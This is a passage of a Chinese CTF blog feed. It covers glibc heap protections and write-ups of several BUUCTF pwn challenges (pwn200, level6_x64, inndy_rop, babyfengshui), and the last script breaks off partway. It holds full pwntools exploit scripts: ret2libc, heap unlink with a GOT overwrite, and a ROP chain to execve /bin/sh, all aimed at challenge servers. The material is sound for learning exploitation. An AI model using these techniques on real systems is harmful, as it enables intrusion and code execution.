id="libc-2-32-so"><a href="#libc-2-32-so" class="headerlink" title="libc-2.32.so"></a>libc-2.32.so</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <br>&#123;<br>    <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">        add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    *fb = p;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">            add (i.e., double free).  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>        old2 = old;<br>        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))<br>        != old2);<br></code></pre></td></tr></table></figure><p>上面是glibc2.32下的fastbin源码，同样存在跟tcache一样的保护机制，会对 fd 指针进行异或处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br></code></pre></td></tr></table></figure><p>由于这个检测的存在，我们 tcache 申请的地址似乎要做到 0x10 对齐（x64）</p><h2 id="libc-2-34-so"><a href="#libc-2-34-so" class="headerlink" title="libc-2.34.so"></a>libc-2.34.so</h2><p>该版本删除了各种 hook 函数，所以要更换思路，一般可以通过 FSOP 攻击输出流的函数虚表</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇本章是以libc-2.23.so为基础，去对比之后版本的差异问题&lt;/p&gt;
&lt;h2 id=&quot;libc-2-23-so&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="glibc" scheme="http://example.com/tags/glibc/"/>
    
  </entry>
  
  <entry>
    <title>buu07</title>
    <link href="http://example.com/2021/08/12/2021-08-12-buu07/"/>
    <id>http://example.com/2021/08/12/2021-08-12-buu07/</id>
    <published>2021-08-12T10:56:31.000Z</published>
    <updated>2021-10-13T08:01:22.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、xdctf2015-pwn200"><a href="#一、xdctf2015-pwn200" class="headerlink" title="一、xdctf2015_pwn200"></a>一、xdctf2015_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812185855607.png" alt="image-20210812185855607"></p><p>checksec一下，32位，开了nx</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192549644.png" alt="image-20210812192549644"></p><p>程序很简单，这边有个很明显的栈溢出，并且程序含有泄露函数write，构造基础的rop就行了</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192512692.png" alt="image-20210812192512692"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25644</span>)<br><span class="hljs-comment">#p=process(&#x27;./bof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>main=<span class="hljs-number">0x80484d6</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="二、jarvisoj-level6-x64"><a href="#二、jarvisoj-level6-x64" class="headerlink" title="二、jarvisoj_level6_x64"></a>二、jarvisoj_level6_x64</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812200521406.png" alt="image-20210812200521406"></p><p>看附件名字，应该是道堆题，这道堆题没开PIE，RELRO没开全，这种题目一般是想办法修改got表，这样能稳定getshell</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200255661.png" alt="image-20210914200255661"></p><p>首先，创建了一个大堆块，用来保存后面申请堆块的size，指针等信息</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200621734.png" alt="image-20210914200621734"></p><p>在申请堆块功能里的这个语句代表分配堆块的大小是0x80的整数倍</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200526193-16316211508721.png" alt="image-20210914200526193"></p><p>在edit功能中，如果你写入与之前申请不匹配的size，那么会调用realloc扩充堆块的size，似乎可以造成overlap</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200603042-16316211674692.png" alt="image-20210914200603042"></p><p>free功能的话，堆结构里面的指针没有清零，存在UAF。但是前面的flag、size都清零了，所以只能double free</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914202759594.png" alt="image-20210914202759594"></p><p>有个注意点是在申请堆块中的输入堆块内容时，你输入多大的size，那你相应就要填入多大的字符，否则这边的read是不会停止的</p><p>思路：就先checksec看到的，去劫持got表，一般是free，然后再去释放一个内容为/bin/sh的堆块。这题堆块内容没有清空，并且申请堆块时输入的数据是可以不输入\x00的，所以不会截断，那就说明蕴含着很多脏数据都是可以泄露的！比如libc，比如堆地址，而如果有了堆地址，unlink，随之而来，然后PIE又没开，直接写got表地址，然后写入system地址即可！</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914204249244.png" alt="image-20210914204249244"></p><p>这边释放堆块要注意，得先申请四个，然后隔着释放，因为都是unsorted chunk，得要防止触发unlink合并</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914211338216.png" alt="image-20210914211338216"></p><p>释放完四个堆块后，有残余脏数据的堆结构，现在就要依据这个脏数据进行构造unlink</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914212020955.png" alt="image-20210914212020955"></p><p>很明显，申请出来的，只能在第三个堆地址上伪造出堆头，这样才能释放该伪造堆块，触发unlink</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210915103319358.png" alt="image-20210915103319358"></p><p>unlink成功，把堆块指针的值变为了堆结构上的地址，之后直接对着堆结构修改即可</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210915110109421.png" alt="image-20210915110109421"></p><p>getshell！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./freenote_x64&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27343</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Length of new note: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Length of note: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0 </span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#因为会凑齐0x80的大小，所以也是相当于申请出0x80的堆</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;0. aaaaaaaa&quot;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">6464</span> <span class="hljs-comment">#接收四个，是因为打远程时，发现堆地址就是四个字节的</span><br>log.success(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>p.recvuntil(<span class="hljs-string">&quot;2. bbbbbbbb&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#清空堆块，为了后续借用UAF进行unlink</span><br><br><span class="hljs-comment">#unlink</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x110</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x18</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0x90</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) <br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>free(<span class="hljs-number">2</span>)<br><br>free = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>payload = p64(<span class="hljs-number">0x2</span>) + p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x8</span>) + p64(free)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x8</span>,p64(system))<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))   <span class="hljs-comment">#不知道为什么，这里不这样输入，没办法getshell</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="三、inndy-rop"><a href="#三、inndy-rop" class="headerlink" title="三、inndy_rop"></a>三、inndy_rop</h2><p>先checksec一下，32位，只开了nx</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202233200.png" alt="image-20210823202233200"></p><p>进入ida，程序很简单，只有一个gets函数，明显溢出</p><p>然后程序东西很繁杂，这种就是属于静态编译的程序，程序里面包含着程序所需要的函数信息，但是找了一下，没有找到/bin/sh，以及system，那应该就是要构造gadgets了，去使用系统调用号函数获取shell</p><img src="/2021/08/12/2021-08-12-buu07/image-20210823195230792.png" alt="image-20210823195230792" style="zoom:80%;"><p>百度了一下，ROPgadget内置了相关工具，可以直接针对这种题目有现成的exp</p><p><code>ROPgadget --binary rop --ropchain</code></p><img src="/2021/08/12/2021-08-12-buu07/image-20210823195052520.png" alt="image-20210823195052520" style="zoom:80%;"><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201506833.png" alt="image-20210823201506833"></p><p>这边其实还有种办法，就是使用mprotect函数修改.bss段的执行权限，然后写入shellcode，再执行来getshell</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201429425.png" alt="image-20210823201429425"></p><p>程序里面是有mprotect函数的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29804</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br><br>r.sendline(p)<br>r.interactive()<br>r.close()<br></code></pre></td></tr></table></figure><h2 id="四、babyfengshui-33c3-2016"><a href="#四、babyfengshui-33c3-2016" class="headerlink" title="四、babyfengshui_33c3_2016"></a>四、babyfengshui_33c3_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202142271.png" alt="image-20210823202142271"></p><p>checksec一下，32位，开了NX、Canary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823231658268.png" alt="image-20210823231658268"></p><p>漏洞点在于修改堆块内容里面的检查机制有问题：只要把两个堆块分开，一个在头一个在尾，那就代表着能溢出覆盖两个堆块间的所有堆块。而且这很容易就能办到，只要连续申请几次堆块，把最开始申请的释放了，然后我们申请一个被释放大小的堆块，那这个堆块就出现在了头部，而另一个就是在尾部</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827142300094.png" alt="image-20210827142300094"></p><p>而打印函数，认真看，是printf函数，%s，那么这是会解析一个地址，然后把这个地址上的内容打印出来，所以我们通过溢出把free的got表地址写上去，那么解析完打印出来的就是free的真实地址，从而获得libc基址</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143043150.png" alt="image-20210827143043150"></p><p>同样，这边修改description的函数，也是会把description的地址传入进去修改，那么只需要对着前面已经写入free的got表地址的堆块进行这个操作，就能把system函数写进去，从而劫持got表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 27980)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span>(<span class="hljs-params">size, length, text</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;description: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span 